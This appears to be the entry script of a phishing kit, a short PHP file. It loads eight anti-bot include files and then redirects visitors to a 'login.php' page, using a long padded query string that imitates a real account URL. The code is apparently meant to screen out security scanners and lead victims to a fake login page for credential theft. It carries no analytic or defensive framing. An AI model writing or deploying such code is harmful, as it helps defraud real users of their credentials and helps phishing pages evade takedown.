<?php

include '../bots/anti1.php';
include '../bots/anti2.php';
include '../bots/anti3.php';
include '../bots/anti4.php';
include '../bots/anti5.php';
include '../bots/anti6.php';
include '../bots/anti7.php';
include '../bots/anti8.php';
$src="login.php?home-US-userID987647864812334345484351818468-Email-33626626641848798409874987049909840684980546840078965484/-second";
header("location:$src");
?>